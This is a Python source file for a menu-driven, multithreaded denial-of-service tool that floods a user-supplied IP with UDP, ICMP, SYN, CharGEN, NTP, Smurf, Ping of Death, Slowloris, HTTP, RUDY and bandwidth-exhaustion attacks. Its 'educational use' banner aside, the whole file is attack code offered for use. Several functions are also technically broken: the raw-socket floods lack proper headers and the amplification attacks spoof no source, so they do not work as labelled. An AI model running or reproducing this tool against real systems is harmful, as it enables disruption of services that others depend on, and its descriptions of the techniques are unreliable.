import os
import sys
import socket
import random
import time
from termcolor import colored
from threading import Thread, Lock

# Banner anzeigen
def show_banner():
    os.system("clear")
    print(colored("""
    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║  ██║
   ███████║   ██║      ██║   ███████║██║     ███████║
   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔══██║
   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██║
   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    """, "red"))
    print(colored("*******************************************", "yellow"))
    print(colored("*            Combined Attack Tool         *", "yellow"))
    print(colored("*         Created for Educational Use     *", "yellow"))
    print(colored("*******************************************", "yellow"))
    print(colored("Author: Educational Example", "green"))
    print(colored("Usage of this tool must comply with all laws.", "blue"))
    print()

# Helper Functions
def get_target_info():
    ip = input(colored("Enter target IP: ", "cyan"))
    port = int(input(colored("Enter target port (0 if not applicable): ", "cyan")))
    duration = int(input(colored("Enter attack duration (seconds): ", "cyan")))
    return ip, port, duration

def get_threads():
    threads = int(input(colored("Enter number of threads (Max: 100): ", "cyan")))
    return min(threads, 100)

# Universal Attack Function
def execute_attack(ip, port, duration, threads, attack_type, payload=None):
    lock = Lock()
    stats = {"packets_sent": 0}

    def attack():
        nonlocal stats
        sock_type = socket.SOCK_DGRAM if attack_type in ["udp", "chargen"] else socket.SOCK_RAW
        sock = socket.socket(socket.AF_INET, sock_type)
        timeout = time.time() + duration

        while time.time() < timeout:
            try:
                data = payload or random._urandom(1024)
                sock.sendto(data, (ip, port))
                with lock:
                    stats["packets_sent"] += 1
            except Exception:
                continue

    print(colored(f"Starting {attack_type.upper()} attack on {ip}:{port}", "yellow"))
    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    while any(thread.is_alive() for thread in threads_list):
        with lock:
            print(colored(f"Packets sent: {stats['packets_sent']}", "cyan"), end="\r")
        time.sleep(1)

    for thread in threads_list:
        thread.join()
    print(colored(f"\n{attack_type.upper()} attack completed.", "green"))

# Specific Attack Functions
def icmp_flood(ip, duration, threads):
    execute_attack(ip, 0, duration, threads, "icmp", b"\x08\x00" + random._urandom(32))

def syn_flood(ip, port, duration, threads):
    execute_attack(ip, port, duration, threads, "syn", random._urandom(1024))

def ntp_amplification(ip, duration, threads):
    execute_attack(ip, 123, duration, threads, "ntp", b'\x17\x00\x03\x2a')

def smurf_attack(ip, broadcast_ip, duration, threads):
    execute_attack(broadcast_ip, 0, duration, threads, "smurf", b'\x08\x00' + random._urandom(32))

def ping_of_death(ip, duration, threads):
    execute_attack(ip, 0, duration, threads, "ping_of_death", b'\x08\x00' + random._urandom(65500))

def slowloris(ip, port, duration, threads):
    lock = Lock()
    stats = {"connections_made": 0}

    def attack():
        nonlocal stats
        timeout = time.time() + duration
        headers = f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: keep-alive\r\n"

        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                sock.send(headers.encode('utf-8'))
                with lock:
                    stats["connections_made"] += 1
                time.sleep(random.uniform(5, 15))
            except Exception:
                continue

    print(colored(f"Starting Slowloris attack on {ip}:{port}", "yellow"))
    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    for thread in threads_list:
        thread.join()
    print(colored(f"\nSlowloris attack completed. Connections made: {stats['connections_made']}", "green"))

# HTTP Flood
def http_flood(ip, port, duration, threads, rps):
    lock = Lock()
    stats = {"requests_sent": 0}

    def attack():
        nonlocal stats
        timeout = time.time() + duration
        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode('utf-8')
                sock.send(request)
                with lock:
                    stats["requests_sent"] += 1
                time.sleep(1 / rps)
            except Exception:
                continue

    print(colored(f"Starting HTTP Flood attack on {ip}:{port} at {rps} RPS", "yellow"))
    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    for thread in threads_list:
        thread.join()
    print(colored(f"\nHTTP Flood attack completed. Requests sent: {stats['requests_sent']}", "green"))

# R-U-Dead-Yet (RUDY) Attack
def rudy_attack(ip, port, duration, threads):
    lock = Lock()
    stats = {"connections_made": 0}

    def attack():
        nonlocal stats
        timeout = time.time() + duration
        payload = "x" * 1
        headers = f"POST / HTTP/1.1\r\nHost: {ip}\r\nContent-Length: 1000000\r\n\r\n{payload}"

        while time.time() < timeout:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                sock.send(headers.encode('utf-8'))
                with lock:
                    stats["connections_made"] += 1
                time.sleep(random.uniform(5, 15))
            except Exception:
                continue

    print(colored(f"Starting RUDY attack on {ip}:{port}", "yellow"))
    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    for thread in threads_list:
        thread.join()
    print(colored(f"\nRUDY attack completed. Connections made: {stats['connections_made']}", "green"))

# Bandwidth Exhaustion Attack
def bandwidth_exhaustion(ip, port, duration, threads):
    lock = Lock()
    stats = {"bytes_sent": 0}

    def attack():
        nonlocal stats
        timeout = time.time() + duration
        while time.time() < timeout:
            try:
                data = random._urandom(1024)
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.connect((ip, port))
                    sock.send(data)
                    with lock:
                        stats["bytes_sent"] += len(data)
            except Exception:
                continue

    print(colored(f"Starting Bandwidth Exhaustion attack on {ip}:{port}", "yellow"))
    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    for thread in threads_list:
        thread.join()
    print(colored(f"\nBandwidth Exhaustion attack completed. Bytes sent: {stats['bytes_sent']}", "green"))

# Main Menu
def main():
    while True:
        show_banner()
        print("1. UDP Flood")
        print("2. ICMP Flood")
        print("3. SYN Flood")
        print("4. CharGEN Flood")
        print("5. NTP Amplification")
        print("6. Smurf Attack")
        print("7. Ping of Death")
        print("8. Slowloris")
        print("9. HTTP Flood")
        print("10. RUDY Attack")
        print("11. Bandwidth Exhaustion")
        print("12. Exit")

        choice = input(colored("Select an option: ", "cyan"))

        if choice in ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11"]:
            ip, port, duration = get_target_info()
            threads = get_threads()

            if choice == "1":
                execute_attack(ip, port, duration, threads, "udp")
            elif choice == "2":
                icmp_flood(ip, duration, threads)
            elif choice == "3":
                syn_flood(ip, port, duration, threads)
            elif choice == "4":
                execute_attack(ip, port, duration, threads, "chargen", b"CharGEN Flood Payload")
            elif choice == "5":
                ntp_amplification(ip, duration, threads)
            elif choice == "6":
                broadcast_ip = input(colored("Enter broadcast IP: ", "cyan"))
                smurf_attack(ip, broadcast_ip, duration, threads)
            elif choice == "7":
                ping_of_death(ip, duration, threads)
            elif choice == "8":
                slowloris(ip, port, duration, threads)
            elif choice == "9":
                rps = int(input(colored("Enter requests per second (RPS): ", "cyan")))
                http_flood(ip, port, duration, threads, rps)
            elif choice == "10":
                rudy_attack(ip, port, duration, threads)
            elif choice == "11":
                bandwidth_exhaustion(ip, port, duration, threads)
        elif choice == "12":
            print(colored("Exiting... Goodbye!", "red"))
            sys.exit()
        else:
            print(colored("Invalid choice. Please try again.", "red"))

if __name__ == "__main__":
    main()
